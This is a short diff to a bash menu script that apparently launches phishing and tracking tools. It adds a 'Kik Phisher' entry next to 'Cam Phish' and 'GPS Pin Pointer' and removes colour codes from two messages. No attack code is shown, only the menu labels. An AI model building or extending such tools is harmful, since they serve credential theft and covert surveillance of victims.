@@ -19,6 +19,7 @@ echo -e "                                                                       
 
 echo -e "                                                                                                      ${RED}1. Cam Phish${NC}"
 echo -e "                                                                                                      ${RED}2. GPS Pin Pointer${NC}"
+echo -e "                                                                                                      ${RED}3. Kik Phisher      ${NC}"
 echo -e "                                                                                                      ${RED}0. Exit${NC}"
 
 # Read user input
@@ -48,12 +49,12 @@ case $choice in
         
     0)
         # Exit the script
-        echo -e "                                                                                                      ${RED}Exiting...${NC}"
+        echo -e "                                                                                                      Exiting..."
         exit 0
         ;;
     *)
         # Invalid choice
-        echo -e "                                                                                                      ${RED}Invalid choice, please enter 1 or 0.${NC}"
+        echo -e "                                                                                                      Invalid choice, please enter 1 or 0."
         ;;
 esac
 
